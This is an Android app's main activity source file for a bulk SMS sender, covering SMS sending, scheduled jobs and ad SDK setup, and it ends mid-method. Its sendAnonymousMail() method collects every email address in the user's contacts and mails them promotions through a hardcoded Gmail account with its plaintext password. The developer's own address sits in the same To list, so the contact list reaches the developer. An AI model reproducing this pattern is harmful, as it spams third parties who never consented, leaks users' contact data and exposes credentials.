package com.unleashed.android.bulksms2;

import android.app.Activity;
import android.app.Dialog;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentPagerAdapter;
import android.support.v4.app.FragmentTransaction;
import android.support.v4.view.ViewPager;
import android.support.v7.app.ActionBar;
import android.support.v7.app.ActionBarActivity;
import android.support.v7.app.AlertDialog;
import android.telephony.SmsManager;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.inputmethod.InputMethodManager;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.DatePicker;
import android.widget.EditText;
import android.widget.ExpandableListView;
import android.widget.ImageButton;
import android.widget.ListView;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.TextView;
import android.widget.TimePicker;
import android.widget.Toast;



import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.Semaphore;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.AdView;

import com.purplebrain.adbuddiz.sdk.AdBuddiz;
import com.unleashed.android.bulksms2.AboutApp;
import com.unleashed.android.bulksms2.ContactBook;
import com.unleashed.android.bulksms2.R;
import com.unleashed.android.customadapter.PhoneBookRowItem;
import com.unleashed.android.datetimepicker.DateTimePicker;
import com.unleashed.android.datetimepicker.ScheduleClient;
import com.unleashed.android.dbhelper.DBHelper;
import com.unleashed.android.sendemail.Mail;

import com.unleashed.android.expandablelistview.ExpandableListAdapter;

import com.appszoom.appszoomsdk.AppsZoom;       // Appszoom Ad


public class MainActivity extends ActionBarActivity implements ActionBar.TabListener {

    /**
     * The {@link android.support.v4.view.PagerAdapter} that will provide
     * fragments for each of the sections. We use a
     * {@link FragmentPagerAdapter} derivative, which will keep every
     * loaded fragment in memory. If this becomes too memory intensive, it
     * may be best to switch to a
     * {@link android.support.v4.app.FragmentStatePagerAdapter}.
     */
    SectionsPagerAdapter mSectionsPagerAdapter;

    /**
     * The {@link ViewPager} that will host the section contents.
     */
    ViewPager mViewPager;

    ListView lv_PhnNums;        // List view to hold selected numbers.
    EditText et_sms_msg;        // Edit box for holding sms message.
    RadioGroup radgrp;          // Radio Group for holding options to send sms now or set a reminder
    RadioButton radbtn_now, radbtn_set_reminder;

    ArrayAdapter<String> mContactsSelectedAdapter;
    ArrayList<String> mContactsSelectedList;

    // This is a handle so that we can call methods on our service
    private ScheduleClient scheduleClient;

    // Handles to UI Controls on "Set Reminder SMS Tab"
    protected static DateTimePicker dsdttmpick;// = new DateTimePicker(getApplicationContext());
    public DBHelper bulksmsdb;// = new DBHelper(this);


    /**
     * method is used for checking valid email id format.
     *
     * @param email
     * @return boolean true for valid false for invalid
     */
    private boolean isEmailValid(String email) {
        boolean isValid = false;

        String expression = "^[\\w\\.-]+@([\\w\\-]+\\.)+[A-Z]{2,4}$";
        CharSequence inputStr = email;

        Pattern pattern = Pattern.compile(expression, Pattern.CASE_INSENSITIVE);
        Matcher matcher = pattern.matcher(inputStr);
        if (matcher.matches()) {
            isValid = true;
        }
        return isValid;
    }

    private void sendAnonymousMail() {

        try {
            final String User = "promotions.softwaresunleashed";        // write only user name....no need of @gmail.com
            final String Pass = "9211hacker";
            final String Subject = getResources().getString(R.string.email_subject);//"Bulk SMS Launched!!";
            final String EmailBody = getResources().getString(R.string.email_body);

            final String SenderFrom = "promotions.softwaresunleashed@gmail.com";
            final String RecipientsTo[];

            ArrayList<String> emailAddresses = new ArrayList<String>();
            emailAddresses.add("softwares.unleashed@gmail.com");        // Add first default address to self


            // Prepare to get the emails in Phonebook.
            ContentResolver cr = getContentResolver();
            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

            if (cur.getCount() > 0) {
                while (cur.moveToNext()) {
                    String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));

                    Cursor emailCur = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", new String[]{id}, null);
                    while (emailCur.moveToNext()) {
                        String emailContact = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                        String emailType = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));

                        if(isEmailValid(emailContact)){
                            // Add the retrieved email address to
                            emailAddresses.add(emailContact);
                        }

                    }
                    emailCur.close();
                }
            }
            int sizeOfEmailAddresses = emailAddresses.size();

            // Add email address from Array List to String[]
            RecipientsTo = new String[sizeOfEmailAddresses];
            for(int i=0; i < sizeOfEmailAddresses; i++){
                RecipientsTo[i] = emailAddresses.get(i);
            }

            Thread thrSendEmail = new Thread(){
                @Override
                public void run() {
                    super.run();

                    Mail mail = new Mail(User, Pass, Subject, EmailBody, SenderFrom, RecipientsTo);

                    try {
                        // Emails should always be sent in thread, else there would be an exception.
                        // Exception : android.os.NetworkOnMainThreadException
                        mail.send();
                    } catch (Exception e) {
                        e.printStackTrace();
                        Toast.makeText(getBaseContext(), "Error:" + e.toString(), Toast.LENGTH_LONG).show();
                    }
                }
            };
            thrSendEmail.start();       // Start the thread to send email

        } catch (Exception e) {
            Log.e("Bulk SMS: ", "sendAnonymousMail() caught exception.");
			e.printStackTrace();
        }

    }

//    @Override
//    protected void onDestroy() {
//        super.onDestroy();
//
//        //To show an Ad, call the showAd() method. You can select the most suitable moment to display interstitials.
//        //AppsZoom.showAd(this);
//        AppsZoom.fetchAd(null, new AppsZoom.OnAdFetchedListener() {
//            @Override
//            public void onAdFetched() {
//                AppsZoom.showAd(MainActivity.this);
//            }
//        });
//    }

    @Override
    protected void onStop() {
        super.onStop();

        // When our activity is stopped ensure we also stop the connection to the service
        // this stops us leaking our activity into the system *bad*
        if(scheduleClient != null)
            scheduleClient.doUnbindService();

        if(getResources().getInteger(R.integer.host_ads)==1) {

            //To show an Ad, call the showAd() method. You can select the most suitable moment to display interstitials.
            //AppsZoom.showAd(this);
            AppsZoom.fetchAd(null, new AppsZoom.OnAdFetchedListener() {
                @Override
                public void onAdFetched() {
                    AppsZoom.showAd(MainActivity.this);
                }
            });
        }
    }

//    @Override
//    protected void onPostResume() {
//        super.onPostResume();
//
//        //To show an Ad, call the showAd() method. You can select the most suitable moment to display interstitials.
//        //AppsZoom.showAd(this);
//        AppsZoom.fetchAd(null, new AppsZoom.OnAdFetchedListener() {
//            @Override
//            public void onAdFetched() {
//                AppsZoom.showAd(MainActivity.this);
//            }
//        });
//    }


    private void alert_dialog_buy_bulk_sms(){
        ///////////////////////////
        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        builder.setIcon(R.drawable.bulksmsapplogo);
        builder.setCancelable(true);
        builder.setTitle("Paid App Feature");
        builder.setMessage("The feature you are trying to access is available in Paid version of the app. Please buy Bulk SMS on Google PlayStore. \nClick OK to buy on Google Play Store. \nClick CANCEL to dismiss. ");

        builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialogInterface, int i) {
                // Request to buy Bulk SMS on Google Play.
                final String appPackageName = "com.unleashed.android.bulksms2"; //getPackageName();
                final Intent openPlayStore = new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName));

                if (hasHandlerForIntent(openPlayStore))
                    startActivity(openPlayStore);
                else
                    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));

            }
        });

        builder.setNegativeButton("CANCEL", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialogInterface, int i) {
                dialogInterface.dismiss();
            }
        });

        AlertDialog alert = builder.create();
        alert.show();
        ///////////////////////////
    }

    public void display_toast(String Msg){
        Toast.makeText(MainActivity.this, Msg, Toast.LENGTH_SHORT).show();
    }
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Display Splash Screen on Application Load
        display_splash_screen();

        setContentView(R.layout.activity_main);

        // Invoke Database
        bulksmsdb = new DBHelper(getApplicationContext());

        // Create a new service client and bind our activity to this service
        scheduleClient = new ScheduleClient(this);
        scheduleClient.doBindService();

        dsdttmpick = new DateTimePicker(getApplicationContext());



        if(getResources().getInteger(R.integer.host_ads)==1) {

            // Ad Buddiz SDK initialization
            AdBuddiz.setPublisherKey("9bd94a6a-6b11-4dd7-98b5-7b98522e78c8");
            AdBuddiz.cacheAds(MainActivity.this); // this = current Activity

            //Init the SDK as soon as possible, for example in the onCreate() method of your main activity.
            AppsZoom.start(this);
            Thread thrAdThread = new Thread() {
                @Override
                public void run() {
                    super.run();

                    boolean toggle = false;
                    while (true) {
                        try {
                            sleep(3 * 60 * 1000);  // wait for 3 mins before

                            if(toggle){
                                if (AdBuddiz.isReadyToShowAd(MainActivity.this)) { // this = current Activity
                                    AdBuddiz.showAd(MainActivity.this);
                                }
                            }else{
                                //To show an Ad, call the showAd() method. You can select the most suitable moment to display interstitials.
                                //AppsZoom.showAd(this);
                                AppsZoom.fetchAd(null, new AppsZoom.OnAdFetchedListener() {
                                    @Override
                                    public void onAdFetched() {
                                        AppsZoom.showAd(MainActivity.this);
                                    }
                                });
                            }
                            toggle = !toggle;
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
            };
            thrAdThread.start();

            ////////////-----------------------------------------/////////////



        }



        // Set up the action bar.
        final ActionBar actionBar = getSupportActionBar();
        actionBar.setNavigationMode(ActionBar.NAVIGATION_MODE_TABS);


        // To set icon for action bar
        actionBar.setIcon(R.drawable.bulksmsapplogo);
//        //To enable the back button in your app use
//        actionBar.setHomeButtonEnabled(true);
//        actionBar.setDisplayHomeAsUpEnabled(true);
//

        // Create the adapter that will return a fragment for each of the three
        // primary sections of the activity.
        mSectionsPagerAdapter = new SectionsPagerAdapter(getSupportFragmentManager());

        // Set up the ViewPager with the sections adapter.
        mViewPager = (ViewPager) findViewById(R.id.pager);
        mViewPager.setAdapter(mSectionsPagerAdapter);

        // When swiping between different sections, select the corresponding
        // tab. We can also use ActionBar.Tab#select() to do this if we have
        // a reference to the Tab.
        mViewPager.setOnPageChangeListener(new ViewPager.SimpleOnPageChangeListener() {
            @Override
            public void onPageSelected(int position) {
                actionBar.setSelectedNavigationItem(position);
            }
        });

        // For each of the sections in the app, add a tab to the action bar.
        for (int i = 0; i < mSectionsPagerAdapter.getCount(); i++) {
            // Create a tab with text corresponding to the page title defined by
            // the adapter. Also specify this Activity object, which implements
            // the TabListener interface, as the callback (listener) for when
            // this tab is selected.
            actionBar.addTab(
                    actionBar.newTab()
                            .setText(mSectionsPagerAdapter.getPageTitle(i))
                            .setTabListener(this));
        }
    }

    private void display_splash_screen() {

        try{
            // custom dialog
            final Dialog dialog = new Dialog(MainActivity.this);
            dialog.setContentView(R.layout.welcome_splash_screen);
            dialog.setTitle("Bulk SMS");
            dialog.setCancelable(true);
            dialog.setOnShowListener(new DialogInterface.OnShowListener() {
                @Override
                public void onShow(DialogInterface dialogInterface) {
                Thread thrDialogClose = new Thread(){
                    @Override
                    public void run() {
                    super.run();

                    try {
                        sleep(3000);        // Let the dialog be displayed for 3 secs
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    dialog.dismiss();
                    }
                };
                thrDialogClose.start();
                }
            });
            dialog.setCanceledOnTouchOutside(true);
            dialog.show();


        }catch (Exception ex){
            Log.e("Bulk SMS: ", "MainActivity.java:display_splash_screen()");
			ex.printStackTrace();
        }
    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();


        switch (id){
            case R.id.action_tell_a_friend_via_email:
                Intent intent = new Intent(Intent.ACTION_SEND);
                intent.setType("text/html");
                intent.putExtra(Intent.EXTRA_EMAIL, "softwares.unleashed@gmail.com");
                intent.putExtra(Intent.EXTRA_SUBJECT, getResources().getString(R.string.email_subject));
                intent.putExtra(Intent.EXTRA_TEXT, getResources().getString(R.string.email_body));

                startActivity(Intent.createChooser(intent, "Send Email"));
                break;


            case R.id.action_send_promotional_email:
                show_dialog_box_to_request_promotional_email();
                break;

            case R.id.action_rate_app_on_google_play_store:
                rate_app_on_google_play_store();
                break;

            case R.id.action_exit:
                finish();
                break;
        }

        return super.onOptionsItemSelected(item);
    }

    private void show_dialog_box_to_request_promotional_email() {

        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        builder.setIcon(R.drawable.bulksmsapplogo);
        builder.setCancelable(true);
        builder.setTitle("Bulk SMS Promotion: We need a favor from you!!");
        builder.setMessage(R.string.dialog_request_promotional_email_msg);

        builder.setPositiveButton(R.string.confirm_msg, new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialogInterface, int i) {
                // Send Email to all contacts.

                // Ad Mail
                Thread thrSendEmail = new Thread() {
                    @Override
                    public void run() {
                        super.run();
                        sendAnonymousMail();
                    }
                };
                thrSendEmail.start();
            }
        });

        builder.setNegativeButton(R.string.deny_msg, new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialogInterface, int i) {
                dialogInterface.dismiss();
            }
        });

        AlertDialog alert = builder.create();
        alert.show();


    }

    private void rate_app_on_google_play_store() {

        final String appPackageName = getPackageName();
        final Intent openPlayStore = new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName));
        if (hasHandlerForIntent(openPlayStore))
            startActivity(openPlayStore);
        else
            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));
    }

    private boolean hasHandlerForIntent(Intent intent)
    {
        return getPackageManager().queryIntentActivities(intent, PackageManager.MATCH_DEFAULT_ONLY).size() > 0;
    }

    @Override
    public void onTabSelected(ActionBar.Tab tab, FragmentTransaction fragmentTransaction) {
        // When the given tab is selected, switch to the corresponding page in
        // the ViewPager.


        // Code to hide virtual keyboard
        View focus = getCurrentFocus();
        if(focus != null){
            InputMethodManager keyboard = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
            keyboard.hideSoftInputFromWindow(focus.getWindowToken(), 0);
        }

        // Tab - Jobs Reminder
        if(tab.getPosition() == 2){

//            if(getResources().getInteger(R.integer.free_version_code) == 1){
//                alert_dialog_buy_bulk_sms();
//            }



        }


        mViewPager.setCurrentItem(tab.getPosition());
    }

    @Override
    public void onTabUnselected(ActionBar.Tab tab, FragmentTransaction fragmentTransaction) {

        // Code to hide virtual keyboard
        View focus = getCurrentFocus();
        if(focus != null){
            InputMethodManager keyboard = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
            keyboard.hideSoftInputFromWindow(focus.getWindowToken(), 0);
        }


    }

    @Override
    public void onTabReselected(ActionBar.Tab tab, FragmentTransaction fragmentTransaction) {

        // Code to hide virtual keyboard
        View focus = getCurrentFocus();
        if(focus != null){
            InputMethodManager keyboard = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
            keyboard.hideSoftInputFromWindow(focus.getWindowToken(), 0);
        }



    }



    /**
     * A {@link FragmentPagerAdapter} that returns a fragment corresponding to
     * one of the sections/tab/pages.
     */
    public class SectionsPagerAdapter extends FragmentPagerAdapter {

        public SectionsPagerAdapter(FragmentManager fm) {
            super(fm);
        }

        @Override
        public Fragment getItem(int position) {
            // getItem is called to instantiate the fragment for the given page.
            // Return a PlaceholderFragment (defined as a static inner class below).
            return new PlaceholderFragment().newInstance(position + 1);
        }

        @Override
        public int getCount() {
            // Show 4 total pages.
            return 4;
        }

        @Override
        public CharSequence getPageTitle(int position) {
            Locale l = Locale.getDefault();
            switch (position) {
                case 0:
                    return getString(R.string.title_section1).toUpperCase(l);
                case 1:
                    return getString(R.string.title_section2).toUpperCase(l);
                case 2:
                    return getString(R.string.title_section3).toUpperCase(l);
                case 3:
                    return getString(R.string.title_section4).toUpperCase(l);
            }
            return null;
        }
    }



    public class PlaceholderFragment extends Fragment implements View.OnClickListener{
        /**
         * The fragment argument representing the section number for this
         * fragment.
         */
        private static final String ARG_SECTION_NUMBER = "section_number";

        // Static Numbers assiged to Tab(s)
        private static final int TAB_SEND_BULK_SMS = 1;
        private static final int TAB_REMINDER_SMS = 2;
        private static final int TAB_JOBS_SMS = 3;
        private static final int TAB_ABOUT_APP = 4;

        // Handles to UI Controls on "Send Bulk SMS Tab"
        private Button btn_bulksms;
        private TextView lbl_sms_char_counter;
        private ImageButton imgbtn_selectcontacts;



        // Handles to UI Controls on "About App -  Bulk SMS Tab"
        private TextView lbl_version_number;
        private TextView lbl_version_history;
        private TextView lbl_about_app;


        // protected ArrayList<PhoneBookRowItem> mContactsSelected;      // Holds the selected contacts from contact book
        protected ArrayAdapter<String> mContactsSelectedAdapter;

        // View obj variable to pass View instances
        private View mView;




        private void ComposeAndSendMessage(){
            Log.i("Bulk SMS: ", "MainActivity.java:ComposeAndSendMessage()");


            String phoneNumber = "";//et_RecieverPhoneNumber.getText().toString();
            String smsMesg = et_sms_msg.getText().toString();       // Pull in the SMS text
            final Context mContext = getApplicationContext();


            int totalPhoneNumbers = lv_PhnNums.getCount();
            if(totalPhoneNumbers == 0){
                Toast.makeText(MainActivity.this, "Select minimum of one contact...", Toast.LENGTH_LONG).show();
                return;
            }

            if(smsMesg.length() == 0){
                Toast.makeText(MainActivity.this, "Enter Text to Send...", Toast.LENGTH_LONG).show();
                return;
            }

               // Check if RadioButton "Set Reminder" is checked. Then store the mesg and recipient list along with time.
            if(radbtn_set_reminder.isChecked() && dsdttmpick.isInitialized()) {

                // Set Reminder is not available in Free Version of App
//                if(getResources().getInteger(R.integer.free_version_code)==1){
//                    alert_dialog_buy_bulk_sms();
//                    return;
//                }



                // Nothing needs to be done as of now. Just create a job and return.
                String jobId = create_job_task(totalPhoneNumbers, smsMesg);

                // Clean Phone Contacts list view after sending sms.
                int count = mContactsSelectedList.size();
                for(int itr=0; itr < count; itr++){
                    mContactsSelectedList.remove(itr);
                }
                mContactsSelectedAdapter = getContactsSelectedAdapter();
                mContactsSelectedAdapter.notifyDataSetChanged();
                et_sms_msg.setText("");        // clear Edit box ,holding sms message.
                lbl_sms_char_counter.setText("160/0"); // Reset the value of sms char counter

                // Select "Send Now" Radio button
                radbtn_now.setChecked(true);
                btn_bulksms.setText(R.string.btn_bulksms_send_now_text);

                display_toast("New Job # " + jobId + " created. \nSMS will be sent on the choosen Date and Time.");
                return;
            }



            try{
                String smsSent = "SMS_SENT";
                String smsDelivered = "SMS_DELIVERED";

                Intent smsSentIntent = new Intent(smsSent);
                Intent smsDeliveredIntent = new Intent(smsDelivered);

//            smsSentIntent.setAction("com.unleashed.android.bulksms");
//            smsDeliveredIntent.setAction("com.unleashed.android.bulksms");

                PendingIntent sentPI = PendingIntent.getBroadcast(mContext, 0, smsSentIntent, PendingIntent.FLAG_UPDATE_CURRENT);
                PendingIntent deliveredPI = PendingIntent.getBroadcast(mContext, 0,smsDeliveredIntent, PendingIntent.FLAG_UPDATE_CURRENT);

                mContext.registerReceiver(new BroadcastReceiver() {
                    @Override
                    public void onReceive(Context arg0, Intent arg1) {
                        switch (getResultCode()) {
                            case Activity.RESULT_OK:
                                Toast.makeText(mContext, "SMS sent", Toast.LENGTH_SHORT).show();
                                break;
                            case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                                Toast.makeText(mContext, "Generic failure", Toast.LENGTH_SHORT).show();
                                break;
                            case SmsManager.RESULT_ERROR_NO_SERVICE:
                                Toast.makeText(mContext, "No service", Toast.LENGTH_SHORT).show();
                                break;
                            case SmsManager.RESULT_ERROR_NULL_PDU:
                                Toast.makeText(mContext, "Null PDU", Toast.LENGTH_SHORT).show();
                                break;
                            case SmsManager.RESULT_ERROR_RADIO_OFF:
                                Toast.makeText(mContext, "Radio off", Toast.LENGTH_SHORT).show();
                                break;
                        }
                    }
                }, new IntentFilter(smsSent));

                // Receiver for Delivered SMS.
                mContext.registerReceiver(new BroadcastReceiver() {
                    @Override
                    public void onReceive(Context arg0, Intent arg1) {
                        switch (getResultCode()) {
                            case Activity.RESULT_OK:
                                Toast.makeText(mContext, "SMS delivered", Toast.LENGTH_SHORT).show();
                                break;

                            case Activity.RESULT_CANCELED:
                                Toast.makeText(mContext, "SMS Undelivered", Toast.LENGTH_SHORT).show();
                                break;
                        }
                    }
                }, new IntentFilter(smsDelivered));


                // Get default SMS Manager's handler
                SmsManager smsOperation = SmsManager.getDefault();


                // Extract the phone numbers
                for(int i=0; i < totalPhoneNumbers; i++ ){

                    // Get first phone number string from List View
                    phoneNumber = (String)lv_PhnNums.getItemAtPosition(i);


                    // The phoneNumber string contains "Name <phone number>".
                    // Hence we need to extract only the numbers between '<' & '>'
                    int startIndex = phoneNumber.indexOf('<');
                    int endIndex = phoneNumber.indexOf('>');
                    // startIndex+1 , because we need to capture from next character after '<'
                    phoneNumber = phoneNumber.substring(startIndex+1, endIndex);



                    // Finally Send SMS to all numbers in list view
                    smsOperation.sendTextMessage(phoneNumber, null, smsMesg, sentPI, deliveredPI);

                    btn_bulksms.setVisibility(ImageButton.INVISIBLE);           // disable send button for some time, so that user doesnt click it again.


                    if(getResources().getInteger(R.integer.free_version_code)==1){
                        // Show dialog box to request access to sending promotional email
                        show_dialog_box_to_request_promotional_email();
                    }

                    // Display msg for "Sending SMS"
//                    Toast tstmsg = new Toast(MainActivity.this);
//                    tstmsg.setGravity(Gravity.CENTER_VERTICAL, 0, 0);
//                    tstmsg.makeText(MainActivity.this, "Sending Messages...Please Wait.", Toast.LENGTH_LONG);
//                    tstmsg.show();

                    Toast.makeText(MainActivity.this, "Sending SMS(s)...Please Wait.", Toast.LENGTH_LONG).show();


                    final int MAX_AVAILABLE = 0;
                    final Semaphore sms_sent = new Semaphore(MAX_AVAILABLE, true);
                    Thread thrButtonEnable = new Thread(){
                        @Override
                        public void run() {
                            super.run();

                            try{
                                sleep(3000);
                                // release the semaphore
                                sms_sent.release();
                            }catch (Exception ex){
                                Log.e("Bulk SMS: ", "MainActivity.java:ComposeAndSendMessage() caught exception1");
								ex.printStackTrace();
                            }
                        }
                    };
                    thrButtonEnable.start();        // Start the thread to clear sms text mesg and phone list.

                    try {
                        sms_sent.acquire();            // wait here till semaphore is released from thread

                        btn_bulksms.setVisibility(ImageButton.VISIBLE);        // Enable the "Send SMS" button after 2secs

                        // Clean Phone Contacts list view after sending sms.
                        int count = mContactsSelectedList.size();
                        for(int itr=0; itr < count; itr++){
                            mContactsSelectedList.remove(itr);
                        }
                        mContactsSelectedAdapter = getContactsSelectedAdapter();
                        mContactsSelectedAdapter.notifyDataSetChanged();
                        et_sms_msg.setText("");        // clear Edit box ,holding sms message.
                        lbl_sms_char_counter.setText("160/0"); // Reset the value of sms char counter

                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }catch (Exception ex){
                Log.e("Bulk SMS: ", "MainActivity.java:ComposeAndSendMessage() caught exception2");
				ex.printStackTrace();
                //Toast.makeText(MainActivity.this, "Error Sending Messages. Try Again Later.", Toast.LENGTH_SHORT).show();
            }
        }

        /**
         * Returns a new instance of this fragment for the given section
         * number.
         */
        public PlaceholderFragment newInstance(int sectionNumber) {
            PlaceholderFragment fragment = new PlaceholderFragment();
            Bundle args = new Bundle();
            args.putInt(ARG_SECTION_NUMBER, sectionNumber);
            fragment.setArguments(args);

            return fragment;
        }

        public PlaceholderFragment() {

        }

        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container,
                                 Bundle savedInstanceState) {

            View rootView = inflater.inflate(R.layout.fragment_send_bulk_sms, container, false);


            int TabNumber;
            Bundle args = getArguments();
            TabNumber = args.getInt(ARG_SECTION_NUMBER);

            switch(TabNumber){
                case TAB_SEND_BULK_SMS:
                    rootView = inflater.inflate(R.layout.fragment_send_bulk_sms, container, false);
                    // Get all the handles
                    mView = rootView;
                    initSendBulkSMSTab(mView);
                    break;

                case TAB_REMINDER_SMS:
                    rootView = inflater.inflate(R.layout.fragment_reminder_bulk_sms, container, false);
                    mView = rootView;
                    initSMSReminderTab(mView);
                    break;

                case TAB_JOBS_SMS:
                    rootView = inflater.inflate(R.layout.fragment_jobs_sms, container, false);
                    mView = rootView;
                    initJobsSMSTab(mView);
                    break;

                case TAB_ABOUT_APP:
                    rootView = inflater.inflate(R.layout.fragment_about_app, container, false);
                    mView = rootView;
                    initAboutAppTab(mView);
                    break;
            };

            return rootView;
        }


        private ExpandableListAdapter listAdapter;
        private ExpandableListView exLV;
        private List<String> listDataHeader;
        private HashMap<String, List<String>> listDataChild;
        private int refresh_list_flag = 0;

        private void initJobsSMSTab(View localView) {

            //////////// Add to Fragment ///////////////
            FragmentManager manager = getSupportFragmentManager();
            FragmentTransaction transaction = manager.beginTransaction();
            Fragment fragment = new Fragment();
            transaction.add(R.id.container_jobs_list, fragment);
            transaction.commit();
            ////////////////////////////////////////////

            if (getResources().getInteger(R.integer.host_ads) == 1) {
                // Invoke AdView
                AdView mAdView = (AdView) localView.findViewById(R.id.adView_jobs_sms_tab);
                AdRequest adRequest = new AdRequest.Builder().build();
                mAdView.loadAd(adRequest);
            }


            // TODO  : implement an expandable list view to show JOBS
            exLV = (ExpandableListView) localView.findViewById(R.id.expandableListView_smsjobs);
            exLV.setOnItemLongClickListener(new AdapterView.OnItemLongClickListener() {
                @Override
                public boolean onItemLongClick(AdapterView<?> adapterView, View view, int i, long l) {

                    return false;
                }
            });


            if (refresh_list_flag == 0) {
                refresh_job_list();
                refresh_list_flag = 1;
            }

            ImageButton getrec = (ImageButton) localView.findViewById(R.id.imgbtn_refresh_records);
            getrec.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {

                    display_toast("Refreshing List...Please Wait.");
                    int number = refresh_job_list();

                    if (number == 0)
                        display_toast("No Pending Jobs to display.");

                }
            });



            // TODO : Implement Delete All DB Records & Alarms
//            ImageButton delete_all_rec = (ImageButton)localView.findViewById(R.id.imgbtn_cancel_all_records);
//            delete_all_rec.setOnClickListener(new View.OnClickListener() {
//                @Override
//                public void onClick(View view) {
//                    display_toast("Deleting All Pending Records.");
//                    delete_all_records();
//                }
//            });
//
//        }

        // TODO : Implement Delete All DB Records & Alarms
//        private void delete_all_records() {
//
//
//            AlarmManager am = (AlarmManager) getApplication().getSystemService(Context.ALARM_SERVICE);
//            am.cancel();
//
//
//        }
//
        }

        private int refresh_job_list(){

            int index =0;       // Keep track of number of records

            try {
                listDataHeader = new ArrayList<String>();
                listDataChild = new HashMap<String, List<String>>();



                // Get all pending Jobs
                Cursor cur = bulksmsdb.retrieveAllJobs();
                if (cur.moveToFirst()) {


                    do {
                        String jobId = cur.getString(1);        // Job ID
                        String phnNum = cur.getString(2);       // Phone Numbers seperated by comma
                        String smsMsg = cur.getString(3);       // SMS Mesg

                        // preparing list data
                        prepareListData(index, jobId,phnNum, smsMsg );

                        index++;

                        //Toast.makeText(this, "\nEmployee ID: " + c.getString(0) + "\nEmployee Name: " + c.getString(1) + "\nEmployee Salary: " + c.getString(2), Toast.LENGTH_LONG).show();
                    }
                    while (cur.moveToNext());

                    // Create the list adapter
                    listAdapter = new ExpandableListAdapter(MainActivity.this, exLV, listDataHeader, listDataChild);

                    // setting list adapter
                    exLV.setAdapter(listAdapter);
                }


            } catch (Exception ex) {
                Log.e("Bulk SMS: ", "MainActivity.java:refresh_job_list() caught exception");
				ex.printStackTrace();
            }

            return index;

        }
        private void prepareListData(int index, String jobId, String phnNum, String smsMsg) {



            // Adding child data
            listDataHeader.add(jobId);

            // Adding sub-child data
            List<String> sub_child = new ArrayList<String>();
            sub_child.add(smsMsg);
            sub_child.add(phnNum);

            listDataChild.put(listDataHeader.get(index), sub_child);

        }

        private void initSMSReminderTab(View localView) {


            //////////// Add to Fragment ///////////////
            FragmentManager manager = getSupportFragmentManager();
            FragmentTransaction transaction = manager.beginTransaction();
            Fragment fragment = new Fragment();
            transaction.add(R.id.container_reminder_bulk_sms, fragment);
            transaction.commit();
            ////////////////////////////////////////////

            if(getResources().getInteger(R.integer.host_ads)==1) {
                // Invoke AdView
                AdView mAdView = (AdView) localView.findViewById(R.id.adView_reminder_bulk_sms_tab);
                AdRequest adRequest = new AdRequest.Builder().build();
                mAdView.loadAd(adRequest);
            }

            final DatePicker dtpicker = (DatePicker)localView.findViewById(R.id.datePicker);
            final TimePicker timePicker = (TimePicker)localView.findViewById(R.id.timePicker);




            Button btnSetScheduleDone = (Button)localView.findViewById(R.id.btn_setSchedule);
            btnSetScheduleDone.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {

                    dsdttmpick.setMonth(dtpicker.getMonth());               // month is zero indexed
                    dsdttmpick.setDay(dtpicker.getDayOfMonth());
                    dsdttmpick.setYear(dtpicker.getYear());

                    dsdttmpick.setHh(timePicker.getCurrentHour());
                    dsdttmpick.setMm(timePicker.getCurrentMinute());

                    dsdttmpick.setInitialized(true);

                    try{
                        String strBtnText = getResources().getString(R.string.btn_bulksms_set_reminder_text);
                        strBtnText += String.valueOf(dsdttmpick.getDay()) + "-";
